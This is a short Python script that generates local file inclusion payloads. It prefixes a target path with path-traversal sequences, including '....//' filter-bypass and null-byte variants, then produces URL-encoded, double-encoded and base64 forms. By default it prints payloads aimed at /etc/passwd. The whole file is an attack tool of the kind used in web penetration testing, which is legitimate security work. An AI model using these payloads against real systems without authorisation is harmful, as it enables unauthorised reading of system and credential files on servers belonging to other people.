#!/usr/bin/env python3

import base64

def generate_paths(path, nlevels):
    res = []
    res.append("/..." * nlevels)
    res.append("%00" + ("../" * nlevels)[:-1])
    res.append("/".join([".." for _ in range(nlevels)]))
    res.append(("..../" * nlevels)[:-1])
    res.append(("....//" * nlevels)[:-1])
    return [head + path for head in res]

def url_encode(paths):
    res = []
    for path in paths:
        res.append(path.replace(".", "%2e"))
        res.append(path.replace("/", "%2f"))
        res.append(path.replace("/", "%2f").replace(".", "%2e"))
        res.append(path.replace("/", "%252f"))
        res.append(path.replace(".", "%252e"))
        res.append(path.replace("/", "%252f").replace(".", "%252e"))
    return res

def base64_encode(paths):
    res = []
    for path in paths:
        res.append(base64.b64encode(path.encode()).decode())
    return res

def create_lfi_paths(path, nlevels=8):
    if not path.startswith("/"):
        raise Exception("Must provide an absolute path")
    res = []
    paths = generate_paths(path, nlevels)
    res.extend(paths)
    res.extend(url_encode(paths))
    res.extend(base64_encode(paths))
    return res

if __name__ == "__main__":
    res = create_lfi_paths("/etc/passwd")
    print("\n".join(res))
